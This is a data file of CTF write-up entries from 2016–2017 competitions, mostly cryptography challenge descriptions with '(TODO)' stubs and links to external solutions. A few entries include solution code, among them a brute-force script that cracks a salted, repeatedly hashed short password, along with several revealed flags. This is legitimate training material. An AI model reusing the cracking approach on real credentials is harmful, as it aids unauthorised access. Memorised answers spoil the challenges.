{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-beo-bi-binh-duong", "year": "2016", "name": "banh-beo-bi-binh-duong", "writeup": "# WhiteHat GrandPrix 2016 : Banh beo bi Binh Duong\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 12\n**Description:**\n\n> Submit: WhiteHat{SHA1(flag)}\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto01_28ff92ccba8ed33cb2b7a996c5957c926827def6.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto01_28ff92ccba8ed33cb2b7a996c5957c926827def6.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto01_28ff92ccba8ed33cb2b7a996c5957c926827def6.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-bot-chien", "year": "2016", "name": "banh-bot-chien", "writeup": "# WhiteHat GrandPrix 2016 : Banh bot chien\n\n**Category:** Cryptography\n**Points:** 200\n**Solves:** 4\n**Description:**\n\n> We believe that OTP is very secure. Could you break it?\n> Submit: WhiteHat{SHA1(flag)}\n> http://material.grandprix.whitehatvn.com/gp2016/Crypto02_f8b9c66df60e010535739ec121226a2457114830.zip\n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto02_f8b9c66df60e010535739ec121226a2457114830.zip\n> Alternative server on amazon in case of low traffic:\n> http://54.183.97.137/gp2016/Crypto02_f8b9c66df60e010535739ec121226a2457114830.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-cuon", "year": "2016", "name": "banh-cuon", "writeup": "# WhiteHat GrandPrix 2016 : Banh cuon\n\n**Category:** Cryptography\n**Points:** 200\n**Solves:** 31\n**Description:**\n\n> RSA\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto03_e8a3ff56ed4f337562f3d55a7013a375bb5c86ed.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto03_e8a3ff56ed4f337562f3d55a7013a375bb5c86ed.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto03_e8a3ff56ed4f337562f3d55a7013a375bb5c86ed.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-mi", "year": "2016", "name": "banh-mi", "writeup": "# WhiteHat GrandPrix 2016 : Banh mi\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 5\n**Description:**\n\n> Secret of bread ! \n> \n> Submit: WhiteHat{SHA1(flag)}\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto07_4a3e8fb02d936b25765971c91f316fcb13ec421c.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto07_4a3e8fb02d936b25765971c91f316fcb13ec421c.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto07_4a3e8fb02d936b25765971c91f316fcb13ec421c.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-trang-cuon-thit-heo", "year": "2016", "name": "banh-trang-cuon-thit-heo", "writeup": "# WhiteHat GrandPrix 2016 : banh trang cuon thit heo\n\n**Category:** Cryptography\n**Points:** 300\n**Solves:** 7\n**Description:**\n\n> Help me to decrypt this!!!\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto06_c2e7818a8bc0ad98755419827f643920681ab232.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto06_c2e7818a8bc0ad98755419827f643920681ab232.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto06_c2e7818a8bc0ad98755419827f643920681ab232.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\banh-xeo", "year": "2016", "name": "banh-xeo", "writeup": "# WhiteHat GrandPrix 2016 : Banh Xeo\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 11\n**Description:**\n\n> Beo keep a secret about Banh Xeo. Unfortunately, he had to encode them, please help me read this content.\n> \n> Submit: WhiteHat{SHA1(flag)}\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto04_fd69f7c3e5f6c758ef02df18ddd3a0cb10bc2ee6.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto04_fd69f7c3e5f6c758ef02df18ddd3a0cb10bc2ee6.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto04_fd69f7c3e5f6c758ef02df18ddd3a0cb10bc2ee6.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\bun-cha", "year": "2016", "name": "bun-cha", "writeup": "# WhiteHat GrandPrix 2016 : Bun cha\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 22\n**Description:**\n\n> Alice sent Bob a message, she wants to know what he would like for lunch. She encrypted that message and sent him with Diffie Hellman key exchange . Bod received that message but he forgot his secret number. Could you help him decrypt the message of Alice?\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto08_94e8b6ceebd0e9cefdffffd33c392c3a16dcade2.zip\n> \n> Submit: WhietHat{SHA1(flag)}\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto08_94e8b6ceebd0e9cefdffffd33c392c3a16dcade2.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto08_94e8b6ceebd0e9cefdffffd33c392c3a16dcade2.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-grandprix-2016\\cryptography\\mi-quang", "year": "2016", "name": "mi-quang", "writeup": "# WhiteHat GrandPrix 2016 : Mi Quang\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 18\n**Description:**\n\n> Could you find the rule of the table?\n> \n> Submit: WhiteHat{SHA1(flag)}\n> \n> http://material.grandprix.whitehatvn.com/gp2016/Crypto05_ead0be9a69c0c260acec5f15fe6565f6a89f1189.zip\n> \n> http://bakmaterial.grandprix.whitehatvn.com/gp2016/Crypto05_ead0be9a69c0c260acec5f15fe6565f6a89f1189.zip\n> \n> Alternative server on amazon in case of low traffic:\n> \n> http://54.183.97.137/gp2016/Crypto05_ead0be9a69c0c260acec5f15fe6565f6a89f1189.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n(TODO)\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\0ctf-quals-2017\\crypto\\integrity-75", "year": "2017", "name": "integrity-75", "writeup": "# 0ctf quals 2017 : integrity\n\n**Category:** Crypto\n**Points:** 75\n**Solves:** \n**Description:**\n\n> Just a simple scheme.\n> \n> nc 202.120.7.217 8221\n> \n> [integrity_f2ed28d6534491b42c922e7d21f59495.zip](./integrity_f2ed28d6534491b42c922e7d21f59495.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [sec // TODO](https://lekensteyn.nl/0ctf2017-integrity.html)\n* [binja](https://gist.github.com/elliptic-shiho/63b97cece15a038678c4a559d01a3055)\n* [p4](https://github.com/p4-team/ctf/tree/master/2017-03-18-0ctf-quals/integrity)\n* [OpenToAll](https://devcraft.io/posts/2017/03/20/integrity-0ctf.html)"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\0ctf-quals-2017\\crypto\\onetimepad-114", "year": "2017", "name": "onetimepad-114", "writeup": "# 0ctf quals 2017 : onetimepad\n\n**Category:** Crypto\n**Points:** 114\n**Solves:** \n**Description:**\n\n> I swear that the safest cryptosystem is used to encrypt the secret!\n> \n> [oneTimePad.zip](./oneTimePad.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [LCâ†¯BC](http://mslc.ctf.su/wp/0ctf-2017-quals-onetimepad-1-and-2/)\n* [binja](https://gist.github.com/elliptic-shiho/0c4ca74230ad02ae68f42ac1673c1114)\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\0ctf-quals-2017\\crypto\\onetimepad2-366", "year": "2017", "name": "onetimepad2-366", "writeup": "# 0ctf quals 2017 : onetimepad2\n\n**Category:** Crypto\n**Points:** 366\n**Solves:** \n**Description:**\n\n> Well, maybe the previous one is too simple. So I designed the ultimate one to protect the top secret!\n> \n> [oneTimePad2.zip](./oneTimePad2.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Snatch The Root](https://grocid.net/2017/03/20/0ctf17-all-crypto-tasks/)\n* [LCâ†¯BC](http://mslc.ctf.su/wp/0ctf-2017-quals-onetimepad-1-and-2/)\n* [binja](https://gist.github.com/elliptic-shiho/66265882a608cf77bf34067c25ed2594)"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\alexctf-2017\\cryptography\\cr1-ultracoded-50", "year": "2017", "name": "cr1-ultracoded-50", "writeup": "# AlexCTF: CR1: Ultracoded\n\n**Category:** Cryptography\n**Points:** 50\n**Solves:** 655\n**Description:**\n\n> Fady didn't understand well the difference between encryption and encoding,\n> so instead of encrypting some secret message to pass to his friend, he\n> encoded it!\n\n> Hint: Fady's encoding doens't handly any special character\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n * http://fadec0d3.blogspot.com/2017/02/alexctf-2017-crypto.html\n * https://team-nawhack.fr/2017/02/06/alexctf-2017-cr1-ultracoded/\n * https://0xd13a.github.io/ctfs/alexctf2017/ultracoded\n * https://meem67.github.io/blog/2017-02-03/alex_ctf_writeups.html#Cryptography1\n * https://ngaoopmeo.blogspot.com/2017/02/alexctf-2017write-upcr1-ultracoded.html\n * http://thu11d3r.blogspot.com/2017/02/bits-ctf-2017crypto-150p-what-is-this_6.html\n * http://writeups.ctflearn.com/alexctf-writeups-2/\n * https://www.youtube.com/watch?v=Zor5z-4w1_Y\n * https://neolex.tuxfamily.org/2017/02/06/alexctf-ultracoded-crypto50/\n * https://drive.google.com/open?id=0B6pr1LpSJl7iTkdqNkZWVkJNb2M\n * https://github.com/R3dCr3sc3nt/AlexCTF/blob/master/CR1-Ultracoded/README.md\n * http://www.aucyberclub.org/blog/2017/02/12/alexctfcr1writeup.html\n * http://h4ck4s3cur1ty.tistory.com/9\n * http://www.pogteam.com.br/2017/02/15/alexctf-2017-cr1-ultracoded/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\alexctf-2017\\cryptography\\cr2-many-time-secrets-100", "year": "2017", "name": "cr2-many-time-secrets-100", "writeup": "# AlexCTF: CR2: Many time secrets\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** 302\n**Description:**\n\n> This time Fady learned from his old mistake and decided to use onetime pad as\n> his encryption technique, but he never knew why people call it one time pad!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n * http://badbytes.io/2017/02/07/alexctf-2017\n * http://r.rogdham.net/28\n * http://ronins.team/alexctf_cr2_many_time_secrets/\n * http://fadec0d3.blogspot.com/2017/02/alexctf-2017-crypto.html\n * https://0xd13a.github.io/ctfs/alexctf2017/many-time-secrets\n * http://g4ngli0s.logdown.com/\n * http://writeups.ctflearn.com/alexctf-writeups-2/\n * https://github.com/pogTeam/writeups/blob/master/2017/AlexCTF/cr2/manyTimePadAttack.py\n * http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\n * https://github.com/R3dCr3sc3nt/AlexCTF/blob/master/CR2-Many_time_secrets/README.md\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\alexctf-2017\\cryptography\\cr3-what-is-this-encryption-150", "year": "2017", "name": "cr3-what-is-this-encryption-150", "writeup": "# AlexCTF: CR3: What is this encryption?\n\n**Category:** Cryptography\n**Points:** 150\n**Solves:** 388\n**Description:**\n\n> Fady assumed this time that you will be so n00b to tell what encryption he is\n> using\n>\n> he send the following note to his friend in plain sight :\n>\n> p=0xa6055ec186de51800ddd6fcbf0192384ff42d707a55f57af4fcfb0d1dc7bd97055e8275cd4b78ec63c5d592f567c66393a061324aa2e6a8d8fc2a910cbee1ed9\n>\n> q=0xfa0f9463ea0a93b929c099320d31c277e0b0dbc65b189ed76124f5a1218f5d91fd0102a4c8de11f28be5e4d0ae91ab319f4537e97ed74bc663e972a4a9119307\n>\n> e=0x6d1fdab4ce3217b3fc32c9ed480a31d067fd57d93a9ab52b472dc393ab7852fbcb11abbebfd6aaae8032db1316dc22d3f7c3d631e24df13ef23d3b381a1c3e04abcc745d402ee3a031ac2718fae63b240837b4f657f29ca4702da9af22a3a019d68904a969ddb01bcf941df70af042f4fae5cbeb9c2151b324f387e525094c41\n>\n> c=0x7fe1a4f743675d1987d25d38111fae0f78bbea6852cba5beda47db76d119a3efe24cb04b9449f53becd43b0b46e269826a983f832abb53b7a7e24a43ad15378344ed5c20f51e268186d24c76050c1e73647523bd5f91d9b6ad3e86bbf9126588b1dee21e6997372e36c3e74284734748891829665086e0dc523ed23c386bb520\n>\n> He is underestimating our crypto skills!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n * https://team-nawhack.fr/2017/02/06/alexctf-2017-cr3-what-is-this-encryption/\n * https://0xd13a.github.io/ctfs/alexctf2017/what-is-this-encryption\n * http://thu11d3r.blogspot.com/2017/02/bits-ctf-2017crypto-150p-what-is-this.html\n * https://blog.passwd.ninja/index.php/2017/02/05/alexctf-2017-cr3-what-is-this-encryption/\n * http://writeups.ctflearn.com/alexctf-writeups-2/\n * https://github.com/Ne0Lux-C1Ph3r/WRITE-UP/blob/master/AlexCTF/CR3:_What_is_this_encryption.md\n * https://isitdtu.blogspot.com/2017/02/alexctf-crypto-3.html\n * https://github.com/pogTeam/writeups/blob/master/2017/AlexCTF/cr3/cr3.py\n * https://neolex.tuxfamily.org/2017/02/06/alexctf-what-is-the-encryption-crypto150/\n * https://github.com/ChalmersCTF/Writeups/tree/master/AlexCTF%202017-02-05/CR3\n * https://drive.google.com/open?id=0B6pr1LpSJl7iQ0ZNV0NET1liaUE\n * http://ronins.team/alexctf_cr3_what_is_this_encryption/\n * https://ngaoopmeo.blogspot.com/2017/02/alex-ctf-2017writeupcr3-what-is-this.html\n * http://dann.com.br/alexctf2k17-crypto150-what_is_this_encryption/\n"}
{"source": "write-ups-2017", "category": "RSA", "path": "data\\write-ups-2017\\alexctf-2017\\cryptography\\cr4-poor-rsa-200", "year": "2017", "name": "cr4-poor-rsa-200", "writeup": "# AlexCTF: CR4: Poor RSA\n\n**Category:** Cryptography\n**Points:** 200\n**Solves:** 255\n**Description:**\n\n> This time Fady decided to go for modern cryptography implementations, He is\n> fascinated with choosing his own prime numbers, so he picked up RSA once\n> more. Yet he was unlucky again!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n * http://r.rogdham.net/28\n * https://isitdtu.blogspot.com/2017/02/alexctf-cr4poor-rsa.html\n * http://fadec0d3.blogspot.com/2017/02/alexctf-2017-crypto.html\n * https://team-nawhack.fr/2017/02/06/alexctf-2017-poor-rsa/\n * http://ronins.team/alexctf_cr4_poor_rsa/\n * https://0xd13a.github.io/ctfs/alexctf2017/poor-rsa\n * https://github.com/pogTeam/writeups/tree/master/2017/AlexCTF/cr4\n * https://github.com/ginjabenjamin/CTF/tree/master/AlexCTF/CR/CR4\n * https://blog.passwd.ninja/index.php/2017/02/05/alexctf-2017-cr4-poor-rsa-200/\n * https://github.com/Ne0Lux-C1Ph3r/WRITE-UP/blob/master/AlexCTF/CR4:_Poor_RSA.md\n * http://dann.com.br/alexctf2k17-crypto200-poor_rsa/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\alexctf-2017\\cryptography\\cr5-bring-weakness-300", "year": "2017", "name": "cr5-bring-weakness-300", "writeup": "# AlexCTF: CR5: Bring weakness\n\n**Category:** Cryptography\n**Points:** 300\n**Solves:** 76\n**Description:**\n\n> We got this PRNG as the most secure random number generator for cryptography.\n>\n> Can you prove otherwise\n>\n> nc 195.154.53.62 7412\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n * http://r.rogdham.net/28\n * https://hacktracking.blogspot.se/2017/02/alexctf-cr5-bring-weakness-300-pts.html\n * http://duksctf.github.io/AlexCTF2017-bringweakness/\n * https://github.com/r00ta/myWriteUps/tree/master/ALEXCTF/crypto300\n * https://github.com/ChalmersCTF/Writeups/tree/master/AlexCTF%202017-02-05/CR5\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\belgian-hackerolympiad-2017\\cryptography\\gifted", "year": "2017", "name": "gifted", "writeup": "# Hackerolympiad Thomas More & NVISO : Gifted\n\n**Category:** Cryptography\n**Points:**\n**Solves:** 0\n**Description:** Someone used this NSA-approved-backdoor-free encrypt.py script to encrypt the flag_800x400px.gif.enc picture. Can you decrypt the file and prove itâ€™s not so secure after all?\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# encrypt.py\nimport os\nimport sys\n\nKEY_SIZE = 10\n\ndef expand_key(key, length):\n\treturn (length / len(key)) * key + key[0:(length % len(key))]\n\ndef xor(s1, s2):\n\tassert len(s1) == len(s2)\n\treturn ''.join([chr(ord(a) ^ ord(b)) for a,b in zip(s1, s2)])\n\ndef main():\n\tif len(sys.argv) == 2:\n\t\tkey = os.urandom(KEY_SIZE)\n\n\t\tfilename = sys.argv[1]\n\n\t\tf = open(filename)\n\t\tdata = f.read()\n\t\tf.close()\n\n\t\texpanded_key = expand_key(key, len(data))\n\t\tdata_encrypted = xor(expanded_key, data)\n\n\t\tf = open(filename + \".enc\", \"w\")\n\t\tf.write(data_encrypted)\n\t\tf.close()\n\n\t\tprint \"File %s encrypted with key: %s\" % (filename, key.encode(\"hex\"))\n\telse:\n\t\tprint \"Usage: %s <filename>\" % (sys.argv[0])\n\nif __name__ == \"__main__\":\n\tmain()"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\belgian-hackerolympiad-2017\\cryptography\\he-said-what", "year": "2017", "name": "he-said-what", "writeup": "# Hackerolympiad Thomas More & NVISO : He said what??\n\n**Category:** Cryptography\n**Points:** 20\n**Solves:** 3\n**Description:**  Somebody found a high point challenge and tweeted about it, he even gave away a hint! https://twitter.com/HereIsJ0hnny.\n\n\n\n## Write-up\n\nThe Twitter user linked in the link only had one tweet: `OMï¼§ aâ€„ï½ï½‰llï½‰oï½Žâ€‚ï½oiï½Žï½”ï½“ ï½ƒhallenge was found`. I saw that this text used Unicode homoglyphs (characters that look the same but have a different meaning). I googled \"unicode homoglyph twitter secret\" and the first link that came up was http://holloway.co.nz/steg/. This was a website where you could encode and decode some secret text into a tweet via Unicode homoglyphs. The flag (decoded from that website) was `bazinga`.\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\belgian-hackerolympiad-2017\\cryptography\\is-it-trying-to-tell-me-something", "year": "2017", "name": "is-it-trying-to-tell-me-something", "writeup": "# Hackerolympiad Thomas More & NVISO : Is it trying to tell me something?\n\n**Category:** Cryptography\n**Points:** 15\n**Solves:** 2\n**Description:** Find the flag in the BSOD.scr file. You can find it between quotes.\n\n\n\n## Write-up\n\nThis was a steno challenge categorized as a crypto challenge. As usual with steno challenges, I executed the `file` command:\n```\n$: file BSOD.scr\nBSOD.scr: Zip archive data, at least v2.0 to extract\n```\nI then unzipped the file (`unzip BSOD.scr`), this resulted in 6 PNG files named `BSOD1.png` trough `BSOD6.png`. When I saw these pictures in an image viewer, they all looked like this: a blue background and white characters spread over the screen.\n![BSOD1.png](BSOD1.png)\nI then opened these images as separated layers in GIMP and removed the blue background of every layer except the last one. This was the result:\n![Solution](BSOD_solution.png)\nThe flag was: `The user is going to pick dancing pigs over security every time`.\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\belgian-hackerolympiad-2017\\programming\\drunkmanshash", "year": "2017", "name": "drunkmanshash", "writeup": "# Hackerolympiad Thomas More & NVISO : Drunkmanshash\n\n**Category:** Programming\n**Points:** 50\n**Solves:** 1\n**Description:** Oh man, I drank way too much beer yesterday. During my not-so-sober state I've changed my password and I can't remember it now. However, I still have the algorithm, hash, and salt. I remember the password was less than 5 characters long and contained only lowercase letters. Can you help me find my plaintext password?\n\n```\nPASSWORD = 'Y2FlZDZhMzZlODNlY2M5Mzk5NDUzZGQ3ZmY0MTQ0OTcyZGI2YTgwZGZkYTBiMzU4MDdkMzUyYTNmN2JhMzc5ZDMxMmRjNDU4MDZiMjZmMzA1NzA1MzdlMjA1ZDAzNDc4MmE1M2FmOTNiMTk1ZWU2ODcwOTJhN2JiNTIzMzYwODE='\nSALT = '7049548a11ca1d08d017d2429bb04a3b'\n```\n\nThe used algorithm was: `base64encode( SHA512 * 512( SHA256 * 256( SHA1 ( MD5 * 5( plaintext + salt ) ) ) ) )`\n\n(`SHA512 * 512` means applying SHA512 512 times and all hexdigests are in lowercase)\n\n## Write-up\n\nThe password needs to be bruteforced. In order to do this, I wrote a Python script (the password can probably be cracked faster with another language, but Python allows for a rapid dev-cycle).\nThe cracking speed of this combined hashing algorithm can be improved by first reversing the `base64encode`: since this encodes the information, it is reversible. Running the script took three minutes on my old laptop, so cracking speed isn't that bad. The final Python script for cracking the hash is included in this directory. The password was `frie`.\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# crack.py\nimport itertools\nimport hashlib\nimport string\nimport base64\nPASSWORD = 'Y2FlZDZhMzZlODNlY2M5Mzk5NDUzZGQ3ZmY0MTQ0OTcyZGI2YTgwZGZkYTBiMzU4MDdkMzUyYTNmN2JhMzc5ZDMxMmRjNDU4MDZiMjZmMzA1NzA1MzdlMjA1ZDAzNDc4MmE1M2FmOTNiMTk1ZWU2ODcwOTJhN2JiNTIzMzYwODE='\nSALT = '7049548a11ca1d08d017d2429bb04a3b'\nhashed_pw = base64.b64decode(PASSWORD)\n\n# Algorithm:\n# base64encode( SHA512 * 512( SHA256 * 256( SHA1 ( MD5 * 5( plaintext + salt ) ) ) ) )\n# (SHA512 * 512 means applying SHA512 512 times and all hexdigests are in lowercase)\n\ndef repeat_hash(input_t, hash_mode, times):\n    for i in range(times):\n        input_t = hash_mode(input_t).hexdigest()\n    return input_t\n\ndef hash_password(password):\n    # First step: calculate SHA1 ( MD5 * 5( plaintext + salt ) )\n    first = hashlib.sha1(repeat_hash(password + SALT, hashlib.md5, 5)).hexdigest()\n    # Second step: SHA256 * 256( first )\n    second = repeat_hash(first, hashlib.sha256, 256)\n    # Last step: SHA512 * 512( second )\n    return repeat_hash(second, hashlib.sha512, 512)\n\nif __name__ == \"__main__\":\n    for i in range(1,5):\n        # Create a generator that yields lists of lowercase letters\n        generator = itertools.permutations(string.ascii_lowercase, i)\n        for test in generator:\n            candidate = ''.join(test)\n            if hashed_pw == hash_password(candidate):\n                print(candidate)\n                exit()"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bitsctf-2017\\crypto\\banana-princess-20", "year": "2017", "name": "banana-princess-20", "writeup": "# BITSCTF 2017 : banana-princess-20\n\n**Category:** Crypto\n**Points:** 20\n**Solves:** 76\n**Description:**\n\nThe princess has been kidnapped! It is up to you to rescue her now, with the help of the minions. They have provided you with a letter (which may or may not have touched the kidnappers hands on its way to you).\n\nAuthors - Speeeddy, Blaze\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/USCGA/writeups/tree/master/online_ctfs/bitsctf_2017/banana_princess\n* http://fadec0d3.blogspot.com/2017/02/bitsctf-2017-crypto-banana-princess-20.html\n* https://nacayoshi00.wordpress.com/2017/02/09/bitsctf-writeup/\n* https://github.com/nbrisset/CTF/blob/master/bitsctf-2017/challenges/banana-princess-20\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bitsctf-2017\\crypto\\beginners-luck-40", "year": "2017", "name": "beginners-luck-40", "writeup": "# BITSCTF 2017 : beginners-luck-40\n\n**Category:** Crypto\n**Points:** 40\n**Solves:** 65\n**Description:**\n\nDerp just had his first class of cryptography, and he feels really confident about his skills in this field. Can you break his algorithm and get the flag?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/USCGA/writeups/tree/master/online_ctfs/bitsctf_2017/beginners_luck\n* http://fadec0d3.blogspot.com/2017/02/bitsctf-2017-crypto-banana-princess-20.html\n* https://github.com/p4-team/ctf/tree/master/2017-02-04-bitsctf/beginners_luck\n* http://flack3r.tistory.com/entry/BCTF-2017Beginners-luck-crypto-40\n* https://nacayoshi00.wordpress.com/2017/02/09/bitsctf-writeup/\n", "solution_code": "\n# enc27.py\n#!/usr/bin/env python\n\ndef supa_encryption(s1, s2):\n    res = [chr(0)]*24\n    for i in range(len(res)):\n        q = ord(s1[i])\n        d = ord(s2[i])\n        k = q ^ d\n        res[i] = chr(k)\n    res = ''.join(res)\n    return res\n\ndef add_pad(msg):\n    L = 24 - len(msg)%24\n    msg += chr(L)*L\n    return msg\n\nwith open('fullhd.png','rb') as f:\n    data = f.read()\n\ndata = add_pad(data)\n\n\nwith open('key.txt') as f:\n    key = f.read()\n    \nenc_data = ''\nfor i in range(0, len(data), 24):\n    enc = supa_encryption(data[i:i+24], key)\n    enc_data += enc\n\nwith open('BITSCTFfullhd.png', 'wb') as f:\n    f.write(enc_data)\n\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bitsctf-2017\\crypto\\enigma-30", "year": "2017", "name": "enigma-30", "writeup": "# BITSCTF 2017 : enigma-30\n\n**Category:** Crypto\n**Points:** 30\n**Solves:** 49\n**Description:**\n\nIts World War II and Germans have been using Enigma to encrypt their messages. Our analysts have figured that they might be using XOR-encryption. XOR-encrption is vulnerable to a known-plaintext attack. Sadly all we have got are the encrypted intercepted messages. Your task is to break the Enigma and get the flag.\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://fadec0d3.blogspot.com/2017/02/bitsctf-2017-crypto-banana-princess-20.html\n* https://github.com/p4-team/ctf/tree/master/2017-02-04-bitsctf/enigma\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bitsctf-2017\\crypto\\fanfie-20", "year": "2017", "name": "fanfie-20", "writeup": "# BITSCTF 2017 : fanfie-20\n\n**Category:** Crypto\n**Points:** 20\n**Solves:** 8\n**Description:**\n\nBrute and get the base 32 format of flag.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://codisec.com/bitsctf-2017-fanfie/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bitsctf-2017\\crypto\\sherlock-60", "year": "2017", "name": "sherlock-60", "writeup": "# BITSCTF 2017 : sherlock-60\n\n**Category:** Crypto\n**Points:** 60\n**Solves:** 110\n**Description:**\n\nSherlock has a mystery in front of him. Help him to find the flag.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/USCGA/writeups/tree/master/online_ctfs/bitsctf_2017/sherlock\n* http://fadec0d3.blogspot.com/2017/02/bitsctf-2017-crypto-banana-princess-20.html\n* http://www.pogteam.com.br/2017/02/05/bitsctf-2017-sherlock/\n* https://github.com/p4-team/ctf/tree/master/2017-02-04-bitsctf/sherlock\n* http://thu11d3r.blogspot.com/2017/02/bits-ctf-2017crypto-60p-sherlock.html\n* https://nacayoshi00.wordpress.com/2017/02/09/bitsctf-writeup/\n* https://github.com/nbrisset/CTF/blob/master/bitsctf-2017/challenges/sherlock-60\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\boston-key-party-2017\\crypto\\minesweeper-350", "year": "2017", "name": "minesweeper-350", "writeup": "# Boston Key Party CTF 2017: minesweeper-350\n\n**Category:** Crypto\n**Points:** 350\n**Solves:** 5\n**Description:**\n\n> Find which bombs are real and which are duds---without exploding any of them!\n>\n> For those wondering why this is cryptography: This technique can be used to\n> detect eavesdropping on a quantum channel, without tipping the eavesdroppers\n> off.\n>\n> Connect via TCP, 54.202.194.91:65535\n>\n> [minesweeper.go](minesweeper.go)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [BORG](https://gist.github.com/duckythescientist/f46036b1b13c9e5751eae9026c04c444)\n* [p4](https://github.com/p4-team/ctf/tree/master/2017-02-25-bkp/minesweeper)"}
